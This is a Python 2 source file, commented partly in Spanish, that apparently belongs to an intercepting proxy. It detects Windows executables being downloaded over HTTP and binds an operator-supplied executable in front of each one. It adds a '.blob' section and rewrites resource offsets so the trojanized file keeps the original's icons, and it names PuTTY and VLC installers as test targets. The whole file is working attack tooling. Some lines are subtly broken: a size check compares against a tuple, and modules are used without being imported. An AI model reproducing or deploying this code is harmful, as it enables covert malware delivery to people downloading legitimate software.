from pefile import *
from os import stat
import pefile
from socket import *
import struct, random

'''
For test:
    http://the.earth.li/~sgtatham/putty/0.63/x86/putty.exe
    http://ftp.free.org/mirrors/videolan/vlc/2.1.5/win32/vlc-2.1.5-win32.exe

'''

directorio_temporal = 'temporal/'
nombre_seccion      = '.blob'

PEContentTypes = ["application/x-msdos-program", "application/x-msdownload", "application/x-dosexec",
                  "application/vnd.openxmlformats-officedocument.wordprocessingml.document"]

genericPEContentTypes = ["application/octet-stream", "application/x-executable"]

PE_FILE_UP_LIMIT = 90000000
PE_FILE_DOWN_LIMIT = 1000


def PECheck(headers, uri, buffer):


    if "content-length" in headers:
        if int(headers["content-length"]) in (PE_FILE_UP_LIMIT, PE_FILE_DOWN_LIMIT) :
            return False
    else:
        return False
    

    try:
        if buffer[:2]!='MZ':
            return False
    except:
        return False

    if "content-type" in headers:
        contenttype = headers["content-type"]
        if contenttype in PEContentTypes:
            return True

        if contenttype in genericPEContentTypes:
            if '.exe' in uri.lower():
                return True

            if 'content-disposition' in headers:
                if '.exe' in headers['content-disposition'].lower():
                    return True

    return False


class PEHandler():
    agregado = None
    exe = None
    padding = 0
    exe_file = None
    change_rsrc = True
    section_padding = 0
    def __init__(self, exe_file):
        self.exe_file = exe_file
        return

    '''
    Bind es el manejador principal
    Devuelve el buffer modificado, el nuevo Content-Length y la longitud del padding

    '''

    def Bind(self, data, datalen, contentlength=0, downloaded_name='temporal.exe', change_rsrc = True, section_name = nombre_seccion):
        if self.change_rsrc:
            self.change_rsrc = change_rsrc

        if self.agregado is None and (self.exe_file is None or contentlength == 0):
            print '> No enought params to modify the PE file'
            return data, contentlength, 0

        if self.agregado is None:
            print '> Loading PE %s' % self.exe_file
            self.exe = EXE(self.exe_file)
            if self.exe is None:
                print '> Error opening original self.exe, is it a PE?'
                return data, contentlength, 0

            self.agregado = EXE(header=data, size=int(contentlength), name=downloaded_name)

            self.agregado.Save_Data(data)

            if not self.change_rsrc:
                self.agregado.arsrc_size = 0

            self.exe.AddSections(self.agregado.size, self.agregado.arsrc_size, section_name = section_name)
            print "> Stub size     %d" % contentlength
            print "> %s size      %d" % (self.exe_file, self.exe.size)

            contentlength += self.exe.size
            self.section_padding = self.exe.pe.sections[-1].SizeOfRawData - self.agregado.size
            self.padding = self.exe.pe.sections[-1].PointerToRawData - contentlength

            print '> Padding                 %d' % self.padding
            # print '> Last PointerToRawData   %d ' % self.exe.pe.sections[-1].PointerToRawData

            contentlength += self.padding + self.agregado.arsrc_size
            print '> Final   size    %d' % contentlength

            # self.exe.AddSections(self.agregado.size,self.agregado.arsrc_VirtualSize)
            msgmod = self.exe.Load_Data(self.exe.size)  # Add binder modded
            msgmod += data  # Add real file
            return msgmod, contentlength, self.agregado.arsrc_size

        else:
            self.agregado.Save_Data(data, to_pos=-1)
            if not self.change_rsrc:
                self.agregado.arsrc_size = 0
            return data, contentlength, self.agregado.arsrc_size + self.padding

    '''
        padding devuelve lo que hay que agregar a la comunicacion y la longitud de los datos
    '''

    def Padding(self):
        if not self.change_rsrc:
            if self.section_padding > 0:
                return str('\x00' * self.section_padding)
            return None

        print '> Getting resources (%d)' % self.agregado.arsrc_size
        rsrc = self.agregado.Get_rsrc(self.agregado.arsrc_size)
        print '> Original resources length %d' % len(rsrc)

        if rsrc:
            recurso = self.exe.Recalculate_rsrc_Data_Offsets(rsrc, self.agregado.arsrc_VirtualAddress,self.agregado.arsrc_offset)
            print '> Final resources length %d' % len(recurso)
            data = '\x00' * self.padding + recurso
            return str(data)

        return None


def randomword(length):
    return ''.join(random.choice(string.lowercase) for i in range(length))


class SectionDoublePError(Exception):
    pass


class SectionDoubleP:
    def __init__(self, pe):
        self.pe = pe

    def __adjust_optional_header(self):
        """ Recalculates the SizeOfImage, SizeOfCode, SizeOfInitializedData and
            SizeOfUninitializedData of the optional header.
        """

        # SizeOfImage = ((VirtualAddress + VirtualSize) of the new last section)
        self.pe.OPTIONAL_HEADER.SizeOfImage = (self.pe.sections[-1].VirtualAddress +
                                               self.pe.sections[-1].Misc_VirtualSize)

        self.pe.OPTIONAL_HEADER.SizeOfCode = 0
        self.pe.OPTIONAL_HEADER.SizeOfInitializedData = 0
        self.pe.OPTIONAL_HEADER.SizeOfUninitializedData = 0

        # Recalculating the sizes by iterating over every section and checking if
        # the appropriate characteristics are set.
        for section in self.pe.sections:
            if section.Characteristics & 0x00000020:
                # Section contains code.
                self.pe.OPTIONAL_HEADER.SizeOfCode += section.SizeOfRawData
            if section.Characteristics & 0x00000040:
                # Section contains initialized data.
                self.pe.OPTIONAL_HEADER.SizeOfInitializedData += section.SizeOfRawData
            if section.Characteristics & 0x00000080:
                # Section contains uninitialized data.
                self.pe.OPTIONAL_HEADER.SizeOfUninitializedData += section.SizeOfRawData

    def __add_header_space(self):
        """ To make space for a new section header a buffer filled with nulls is added at the
            end of the headers. The buffer has the size of one file alignment.
            The data between the last section header and the end of the headers is copied to 
            the new space (everything moved by the size of one file alignment). If any data
            directory entry points to the moved data the pointer is adjusted.
        """

        FileAlignment = self.pe.OPTIONAL_HEADER.FileAlignment
        SizeOfHeaders = self.pe.OPTIONAL_HEADER.SizeOfHeaders

        data = '\x00' * FileAlignment

        # Adding the null buffer.
        self.pe.__data__ = (self.pe.__data__[:SizeOfHeaders] + data +
                            self.pe.__data__[SizeOfHeaders:])

        section_table_offset = (self.pe.DOS_HEADER.e_lfanew + 4 +
                                self.pe.FILE_HEADER.sizeof() + self.pe.FILE_HEADER.SizeOfOptionalHeader)

        # Copying the data between the last section header and SizeOfHeaders to the newly allocated
        # space.
        new_section_offset = section_table_offset + self.pe.FILE_HEADER.NumberOfSections * 0x28
        size = SizeOfHeaders - new_section_offset
        data = self.pe.get_data(new_section_offset, size)
        self.pe.set_bytes_at_offset(new_section_offset + FileAlignment, data)

        # Filling the space, from which the data was copied from, with NULLs.
        self.pe.set_bytes_at_offset(new_section_offset, '\x00' * FileAlignment)

        data_directory_offset = section_table_offset - self.pe.OPTIONAL_HEADER.NumberOfRvaAndSizes * 0x8

        # Checking data directories if anything points to the space between the last section header
        # and the former SizeOfHeaders. If that's the case the pointer is increased by FileAlignment.
        for data_offset in xrange(data_directory_offset, section_table_offset, 0x8):
            data_rva = self.pe.get_dword_from_offset(data_offset)

            if new_section_offset <= data_rva and data_rva < SizeOfHeaders:
                self.pe.set_dword_at_offset(data_offset, data_rva + FileAlignment)

        SizeOfHeaders_offset = (self.pe.DOS_HEADER.e_lfanew + 4 +
                                self.pe.FILE_HEADER.sizeof() + 0x3C)

        # Adjusting the SizeOfHeaders value.
        self.pe.set_dword_at_offset(SizeOfHeaders_offset, SizeOfHeaders + FileAlignment)

        section_raw_address_offset = section_table_offset + 0x14

        # The raw addresses of the sections are adjusted.
        for section in self.pe.sections:
            if section.PointerToRawData != 0:
                self.pe.set_dword_at_offset(section_raw_address_offset, section.PointerToRawData + FileAlignment)

            section_raw_address_offset += 0x28

        # All changes in this method were made to the raw data (__data__). To make these changes
        # accessbile in self.pe __data__ has to be parsed again. Since a new pefile is parsed during
        # the init method, the easiest way is to replace self.pe with a new pefile based on __data__
        # of the old self.pe.
        self.pe = pefile.PE(data=self.pe.__data__)

    def __is_null_data(self, data):
        """ Checks if the given data contains just null bytes.
        """

        for char in data:
            if char != '\x00':
                return False
        return True

    def pop_back(self):
        """ Removes the last section of the section table.
            Deletes the section header in the section table, the data of the section in the file,
            pops the last section in the sections list of pefile and adjusts the sizes in the
            optional header.
        """

        # Checking if there are any sections to pop.
        if (    self.pe.FILE_HEADER.NumberOfSections > 0
                and self.pe.FILE_HEADER.NumberOfSections == len(self.pe.sections)):

            # Stripping the data of the section from the file.
            if self.pe.sections[-1].SizeOfRawData != 0:
                self.pe.__data__ = (self.pe.__data__[:self.pe.sections[-1].PointerToRawData] + \
                                    self.pe.__data__[self.pe.sections[-1].PointerToRawData + \
                                                     self.pe.sections[-1].SizeOfRawData:])

            # Overwriting the section header in the binary with nulls.
            # Getting the address of the section table and manually overwriting
            # the header with nulls unfortunally didn't work out.
            self.pe.sections[-1].Name = '\x00' * 8
            self.pe.sections[-1].Misc_VirtualSize = 0x00000000
            self.pe.sections[-1].VirtualAddress = 0x00000000
            self.pe.sections[-1].SizeOfRawData = 0x00000000
            self.pe.sections[-1].PointerToRawData = 0x00000000
            self.pe.sections[-1].PointerToRelocations = 0x00000000
            self.pe.sections[-1].PointerToLinenumbers = 0x00000000
            self.pe.sections[-1].NumberOfRelocations = 0x0000
            self.pe.sections[-1].NumberOfLinenumbers = 0x0000
            self.pe.sections[-1].Characteristics = 0x00000000

            self.pe.sections.pop()

            self.pe.FILE_HEADER.NumberOfSections -= 1

            self.__adjust_optional_header()
        else:
            raise SectionDoublePError("There's no section to pop.")

    def push_back(self, Name=".NewSec", VirtualSize=0x00000000, VirtualAddress=0x00000000,
                  RawSize=0x00000000, RawAddress=0x00000000, RelocAddress=0x00000000,
                  Linenumbers=0x00000000, RelocationsNumber=0x0000, LinenumbersNumber=0x0000,
                  Characteristics=0xE00000E0, Data=""):
        """ Adds the section, specified by the functions parameters, at the end of the section
            table.
            If the space to add an additional section header is insufficient, a buffer is inserted
            after SizeOfHeaders. Data between the last section header and the end of SizeOfHeaders
            is copied to +1 FileAlignment. Data directory entries pointing to this data are fixed.
            
            A call with no parameters creates the same section header as LordPE does. But for the
            binary to be executable without errors a VirtualSize > 0 has to be set.
            
            If a RawSize > 0 is set or Data is given the data gets aligned to the FileAlignment and
            is attached at the end of the file.
        """
        temp = VirtualSize

        if self.pe.FILE_HEADER.NumberOfSections == len(self.pe.sections):

            FileAlignment = self.pe.OPTIONAL_HEADER.FileAlignment
            SectionAlignment = self.pe.OPTIONAL_HEADER.SectionAlignment

            if len(Name) > 8:
                raise SectionDoublePError("The name is too long for a section.")

            if (    VirtualAddress < (self.pe.sections[-1].Misc_VirtualSize +
                                          self.pe.sections[-1].VirtualAddress)
                    or VirtualAddress % SectionAlignment != 0):

                if (self.pe.sections[-1].Misc_VirtualSize % SectionAlignment) != 0:
                    VirtualAddress = \
                        (self.pe.sections[-1].VirtualAddress + self.pe.sections[-1].Misc_VirtualSize -
                         (self.pe.sections[-1].Misc_VirtualSize % SectionAlignment) + SectionAlignment)
                else:
                    VirtualAddress = \
                        (self.pe.sections[-1].VirtualAddress + self.pe.sections[-1].Misc_VirtualSize)

            if VirtualSize == 0x0:
                VirtualSize = len(Data)

            if (len(Data) % FileAlignment) != 0:
                # Padding the data of the section.
                Data += ('\x00' * (FileAlignment - (len(Data) % FileAlignment)))

            if RawSize != len(Data):
                if (RawSize > len(Data) and (RawSize % FileAlignment) == 0):
                    Data += ('\x00' * (RawSize - (len(Data) % RawSize)))
                else:
                    RawSize = len(Data)

            section_table_offset = (self.pe.DOS_HEADER.e_lfanew + 4 +
                                    self.pe.FILE_HEADER.sizeof() + self.pe.FILE_HEADER.SizeOfOptionalHeader)

            # If the new section header exceeds the SizeOfHeaders there won't be enough space
            # for an additional section header. Besides that it's checked if the 0x28 bytes
            # (size of one section header) after the last current section header are filled
            # with nulls/ are free to use.
            if (        self.pe.OPTIONAL_HEADER.SizeOfHeaders <
                                section_table_offset + (self.pe.FILE_HEADER.NumberOfSections + 1) * 0x28
                        or not self.__is_null_data(self.pe.get_data(section_table_offset +
                                                                            (
                                                                                    self.pe.FILE_HEADER.NumberOfSections) * 0x28,
                                                                    0x28))):

                # Checking if more space can be added.
                if self.pe.OPTIONAL_HEADER.SizeOfHeaders < self.pe.sections[0].VirtualAddress:

                    self.__add_header_space()
                    print "Additional space to add a new section header was allocated."
                else:
                    raise SectionDoublePError("No more space can be added for the section header.")


            # The validity check of RawAddress is done after space for a new section header may
            # have been added because if space had been added the PointerToRawData of the previous
            # section would have changed.
            if (RawAddress != (self.pe.sections[-1].PointerToRawData +
                                   self.pe.sections[-1].SizeOfRawData)):
                RawAddress = \
                    (self.pe.sections[-1].PointerToRawData + self.pe.sections[-1].SizeOfRawData)


                # Appending the data of the new section to the file.
            # if len(Data) > 0:
            # self.pe.__data__ = (self.pe.__data__[:RawAddress] + Data + \
            #                                     self.pe.__data__[RawAddress:])

            section_offset = section_table_offset + self.pe.FILE_HEADER.NumberOfSections * 0x28

            # Manually writing the data of the section header to the file.
            self.pe.set_bytes_at_offset(section_offset, Name)
            self.pe.set_dword_at_offset(section_offset + 0x08, VirtualSize)
            self.pe.set_dword_at_offset(section_offset + 0x0C, VirtualAddress)
            # self.pe.set_dword_at_offset(section_offset+0x10, temp)
            self.pe.set_dword_at_offset(section_offset + 0x10, RawSize)
            self.pe.set_dword_at_offset(section_offset + 0x14, RawAddress)
            self.pe.set_dword_at_offset(section_offset + 0x18, RelocAddress)
            self.pe.set_dword_at_offset(section_offset + 0x1C, Linenumbers)
            self.pe.set_word_at_offset(section_offset + 0x20, RelocationsNumber)
            self.pe.set_word_at_offset(section_offset + 0x22, LinenumbersNumber)
            self.pe.set_dword_at_offset(section_offset + 0x24, Characteristics)

            self.pe.FILE_HEADER.NumberOfSections += 1

            # Parsing the section table of the file again to add the new section to the sections
            # list of pefile.
            self.pe.parse_sections(section_table_offset)

            self.__adjust_optional_header()
        else:
            raise SectionDoublePError("The NumberOfSections specified in the file header and the " +
                                      "size of the sections list of pefile don't match.")

        return self.pe


def print_directories(pe):
    print "id\tOffset\tSize"
    for i in range(len(pe.OPTIONAL_HEADER.DATA_DIRECTORY)):
        print "%d\t0x%x\t%d" % (
            i, pe.OPTIONAL_HEADER.DATA_DIRECTORY[i].VirtualAddress, pe.OPTIONAL_HEADER.DATA_DIRECTORY[i].Size)


class EXE():
    """
        Holds the entire Binding process
        exe passed must be a PE
    """
    saved_data = 0
    def __init__(self, exe=None, header=None, size=0, name=''):
        if header is None:
            self.name = exe
            pe = PE(exe)
            size = stat(exe).st_size
            fd = open(exe, 'rb')
            self.data = fd.read()
            fd.close()
        else:
            try:
                pe = PE(data=header)
            except:
                print '* %s is not a PE file...' % exe
                return

            if name == '':
                self.name = "setup.exe"

            if size == 0:
                print '* Dont have the filesize. Calculating but it can be wrong if Overlay.....!!!'

        print '* PE Size %d'%size

        self.temp_name = directorio_temporal + randomword(10) + '.exe'
        fd = open(self.temp_name, "wb")
        fd.close()
        self.pe = pe
        self.nsec = len(pe.sections)
        self.filesize = pe.OPTIONAL_HEADER.SizeOfHeaders
        i = 0

        self.arsrc_name = 0
        self.arsrc_size = 0
        self.arsrc_offset = 0
        self.arsrc_VirtualSize = 0
        self.arsrc_VirtualAddress = 0
        self.VirtualAddress = 0
        for section in pe.sections:
            self.filesize += section.SizeOfRawData
            if section.Name.replace("\x00", "") == ".rsrc":
                self.arsrc_name = section.Name
                self.arsrc_size = section.SizeOfRawData
                self.arsrc_offset = section.PointerToRawData
                self.arsrc_VirtualSize = section.Misc_VirtualSize
                self.arsrc_VirtualAddress = section.VirtualAddress
            i += 1

        if size != 0:
            self.overlay = size - self.filesize
            self.size = size
            if self.overlay < 0:
                print '* Size provided less than what is at PE header ???? '
                return
        else:
            self.size = self.filesize

    def SavePE(self, filename=''):
        if filename == '':
            filename = self.temp_name
        self.pe.write(filename)
        self.pe.close()
        return filename

    def CopyPE(self, filename=''):  # TODO: Error handling
        if filename == '':
            return False

        fd = open(filename, "wb")
        fd.write(self.pe.__data__)
        fd.close()
        return filename

    def Save_Data(self, data, filename='', to_pos=0):  # TODO: Error handling
        if filename == '':
            filename = self.temp_name

        fd = open(filename, "rb+")

        if to_pos != -1:
            fd.seek(to_pos)
            # print "> Saving data at %s pos %d (0x%x) size %d"%(filename,to_pos,to_pos, len(data))
        else:
            fd.seek(0, 2)
            # print "> Append data at %s "%filename
        self.saved_data += len(data)
        #print '> Saved data %d'%self.saved_data
        fd.write(data)
        fd.close()

    def Append_Data(self, data, filename=''):  # TODO: Error handling
        if filename == '':
            filename = self.temp_name

        fd = open(filename, "ab")
        print "> Append data at %s " % filename
        fd.write(data)
        fd.close()

    def Load_Data(self, length=0, from_pos=0):
        # if length == 0:
        # print '> Loaded Data from PE %d (0x%x) bytes'%(len(self.pe.__data__),len(self.pe.__data__))
        # 			return self.pe.__data__

        fd = open(self.temp_name, "rb")
        fd.seek(from_pos)
        if length == 0:
            data = fd.read()
        else:
            data = fd.read(length)
        print '> Loaded Data from PE %d (0x%x) bytes' % (len(data), len(data))
        fd.close()
        return data

    def AddSections(self, size=0, rsrc_size=0, rsrc_virtualsize=0, section_name = nombre_seccion):
        sections = SectionDoubleP(self.pe)
        self.VirtualAddress = 0
        # Inject blob section (ini file till resources offset)
        print '> Adding sections BLOB SIZE %d\tRSRC SIZE %d (VirtualSize %d 0x%x)' % (
            size, rsrc_size, rsrc_virtualsize, rsrc_virtualsize)
        if (size > 0):
            print "> ADDING first blob (%d bytes)" % size
            try:
                data = "\x00" * size
                self.pe = sections.push_back(Characteristics=0x40000040, Data=data, Name=section_name)
            except SectionDoublePError as e:
                print e

        if rsrc_size > 0:
            print "> ADDING rsrc (%d bytes)" % rsrc_size
            # self.RawAddress = (pe.sections[-1].PointerToRawData + pe.sections[-1].SizeOfRawData)
            try:
                data = "\x00" * rsrc_size
                self.pe = sections.push_back(Characteristics=0x40000040, Data=data, Name=".rsrc",
                                             VirtualSize=rsrc_virtualsize)
            except SectionDoublePError as e:
                print e
            self.pe.OPTIONAL_HEADER.DATA_DIRECTORY[2].VirtualAddress = self.pe.sections[-1].VirtualAddress
            self.pe.OPTIONAL_HEADER.DATA_DIRECTORY[2].Size = self.pe.sections[-1].Misc_VirtualSize
            self.VirtualAddress = self.pe.sections[-1].VirtualAddress

        self.pe.write(self.temp_name)
        self.pe.close()

        return self.VirtualAddress

    def Get_rsrc(self, size):
        if size > 0:
            fo = open(self.temp_name, 'rb')
            fo.seek(self.arsrc_offset)
            orsrc = fo.read(size)
            fo.close()
            return orsrc
        return None

    def Recalculate_rsrc_Data_Offsets(self, orsrc, arsrc_VirtualAddress, arsrc_offset):
        if self.VirtualAddress == 0:
            return None

        VirtualAddress = self.VirtualAddress
        # Resources Parse
        recursos = bytearray(orsrc)
        namedEntries = struct.unpack('<H', orsrc[12:14])
        # print "* Named Entries %d (0x%x)"%(namedEntries[0],namedEntries[0])
        NoNamedEntries = struct.unpack('<H', orsrc[14:16])
        #	print "* No Named Entries %d (0x%x)"%(NoNamedEntries[0],NoNamedEntries[0])

        Entries = namedEntries[0] + NoNamedEntries[0]

        for e in range(Entries):
            dirOffset = struct.unpack('<L', orsrc[20 + (8 * e):24 + (8 * e)])[0]
            if (dirOffset & 0x80000000):
                dirOffset ^= 0x80000000
                #		print "* Dir Offsets 0x%x"%(dirOffset)

            subdir = orsrc[dirOffset:]

            NamedEntries = struct.unpack('<H', subdir[12:14])[0]
            NoNamedEntries = struct.unpack('<H', subdir[14:16])[0]
            subEntries = NamedEntries + NoNamedEntries
            for se in range(subEntries):
                sdirOffset = struct.unpack('<L', subdir[20 + (8 * se):24 + (8 * se)])[0]
                if (sdirOffset & 0x80000000):
                    sdirOffset ^= 0x80000000
                    #			print "\t* Subdir Offsets 0x%x"%(sdirOffset)

                langdir = orsrc[sdirOffset:]
                NamedEntries = struct.unpack('<H', langdir[12:14])[0]
                NoNamedEntries = struct.unpack('<H', langdir[14:16])[0]
                langEntries = NamedEntries + NoNamedEntries
                for le in range(langEntries):
                    ldirOffset = struct.unpack('<L', langdir[20 + (8 * le):24 + (8 * le)])[0]
                    #				print "\t\t* Data Lang Offset 0x%x"%ldirOffset

                    dataheader = orsrc[ldirOffset:]
                    dataOffset = struct.unpack('<L', dataheader[:4])[0] - arsrc_VirtualAddress + arsrc_offset
                    if (dataOffset > 0):
                        #				print "\t\t\t* DATA at 0x%x"%dataOffset
                        new_dataOffset = (dataOffset - arsrc_offset) + VirtualAddress
                        #				print "\t\t\t* New DATA at 0x%x (using VA 0x%x)"%(new_dataOffset,VirtualAddress)
                        buffer = struct.pack("<L", new_dataOffset)
                        for i in range(4):
                            recursos[ldirOffset + i] = buffer[i]

        return recursos

    def delete(self):
        try:
            os.unlink(self.temp_name)
        except:
            pass